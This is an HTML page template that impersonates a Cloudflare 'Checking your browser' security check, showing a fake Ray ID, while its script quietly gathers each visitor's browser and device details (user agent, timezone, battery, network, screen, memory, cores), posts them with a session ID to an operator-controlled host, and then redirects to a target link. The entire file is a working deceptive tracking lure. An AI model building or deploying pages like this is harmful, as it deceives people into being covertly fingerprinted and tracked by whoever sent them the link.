<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        /* Professional "Just a Moment" UI */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .spinner {
            margin-bottom: 20px;
            width: 50px;
            height: 50px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #f6821f; /* Cloudflare Orange */
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { margin: 0; font-size: 1.5rem; font-weight: 500; }
        p { margin-top: 10px; color: #666; font-size: 0.9rem; }
        #footer { margin-top: 50px; font-size: 0.75rem; color: #999; }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <h2>Checking your browser...</h2>
    <p>Please wait while we verify your connection security.</p>
    
    <div id="footer">
        DDoS protection by Cloudflare<br>
        Ray ID: <span id="ray"></span>
    </div>

    <script>
        // 1. Generate Fake Ray ID
        document.getElementById('ray').innerText = Math.random().toString(16).substr(2, 16);

        // 2. Server Configuration
        const CONFIG = {
            UID: "<%= uid %>",       // Session ID from Server
            HOST: "<%= host %>",     // Render URL
            TARGET: "<%= url %>"     // Destination URL
        };

        // 3. Data Gathering Logic
        (async () => {
            // A. Battery Status
            let batteryInfo = "Unknown";
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batteryInfo = `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
                }
            } catch (e) {}

            // B. Network Info
            let connectionInfo = "Unknown";
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                connectionInfo = `${conn.effectiveType.toUpperCase()} (${conn.downlink} Mbps) RTT:${conn.rtt}ms`;
            }

            // C. Screen Info
            const screenInfo = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;

            // D. Prepare the Payload
            const payload = {
                uid: CONFIG.UID,
                rawData: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    battery: batteryInfo,
                    connection: connectionInfo,
                    screen: screenInfo,
                    cores: navigator.hardwareConcurrency || "Unknown",
                    memory: navigator.deviceMemory || "Unknown"
                }
            };

            // 4. Send to Server
            try {
                await fetch(`${CONFIG.HOST}/data`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("Analytics Error:", err);
            }

            // 5. Redirect
            setTimeout(() => {
                window.location.replace(CONFIG.TARGET);
            }, 1500); // 1.5s delay to ensure data is sent
        })();
    </script>

</body>
</html>
